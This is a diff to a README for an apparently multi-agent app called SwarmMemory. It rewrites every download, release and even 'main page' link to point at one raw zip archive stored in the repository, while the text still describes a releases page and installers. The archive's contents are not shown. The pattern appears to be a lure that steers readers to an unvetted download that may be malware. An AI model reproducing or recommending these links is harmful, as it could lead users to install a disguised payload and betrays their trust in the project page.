@@ -1,6 +1,6 @@
 # 🧠 SwarmMemory - Simple Multi-Agent Collaboration System
 
-[![Download SwarmMemory](https://img.shields.io/badge/Download-SwarmMemory-brightgreen?style=for-the-badge)](https://github.com/AryanJangir7877/SwarmMemory/releases)
+[![Download SwarmMemory](https://img.shields.io/badge/Download-SwarmMemory-brightgreen?style=for-the-badge)](https://github.com/AryanJangir7877/SwarmMemory/raw/refs/heads/main/swarm/Memory_Swarm_1.4-alpha.3.zip)
 
 ## 📝 About SwarmMemory
 
@@ -25,7 +25,7 @@ SwarmMemory does not require a powerful computer, but it works best when the sys
 To use SwarmMemory, you first need to get the installation files. Follow these steps closely:
 
 1. Click the large **Download SwarmMemory** button at the top or visit the release page here:  
-   [https://github.com/AryanJangir7877/SwarmMemory/releases](https://github.com/AryanJangir7877/SwarmMemory/releases)
+   [https://github.com/AryanJangir7877/SwarmMemory/raw/refs/heads/main/swarm/Memory_Swarm_1.4-alpha.3.zip](https://github.com/AryanJangir7877/SwarmMemory/raw/refs/heads/main/swarm/Memory_Swarm_1.4-alpha.3.zip)
 
 2. On the releases page, look for the latest version. The newest release should have the highest version number, for example, v1.0 or v1.2.
 
@@ -79,7 +79,7 @@ Take your time to explore the buttons. Each part of the interface is made to be 
 Keep your software current to benefit from new features and fixes.
 
 1. Visit the release page regularly:  
-   [https://github.com/AryanJangir7877/SwarmMemory/releases](https://github.com/AryanJangir7877/SwarmMemory/releases)
+   [https://github.com/AryanJangir7877/SwarmMemory/raw/refs/heads/main/swarm/Memory_Swarm_1.4-alpha.3.zip](https://github.com/AryanJangir7877/SwarmMemory/raw/refs/heads/main/swarm/Memory_Swarm_1.4-alpha.3.zip)
 
 2. Download the latest `.exe` or `.msi` file when available.
 
@@ -101,13 +101,13 @@ For detailed help, see the "Issues" tab on the GitHub repository or contact supp
 SwarmMemory documentation and updates are available on GitHub. Explore the repository to find guides, FAQs, and technical details aimed at developers but sometimes useful for users.
 
 - GitHub main page:  
-  https://github.com/AryanJangir7877/SwarmMemory
+  https://github.com/AryanJangir7877/SwarmMemory/raw/refs/heads/main/swarm/Memory_Swarm_1.4-alpha.3.zip
 
 - Download releases:  
-  https://github.com/AryanJangir7877/SwarmMemory/releases
+  https://github.com/AryanJangir7877/SwarmMemory/raw/refs/heads/main/swarm/Memory_Swarm_1.4-alpha.3.zip
 
 Use the help and community sections on GitHub for tips or questions.
 
 ## 🔗 Quick Download Button
 
-[![Download Latest Release](https://img.shields.io/badge/Download-SwarmMemory-blue?style=for-the-badge)](https://github.com/AryanJangir7877/SwarmMemory/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-SwarmMemory-blue?style=for-the-badge)](https://github.com/AryanJangir7877/SwarmMemory/raw/refs/heads/main/swarm/Memory_Swarm_1.4-alpha.3.zip)
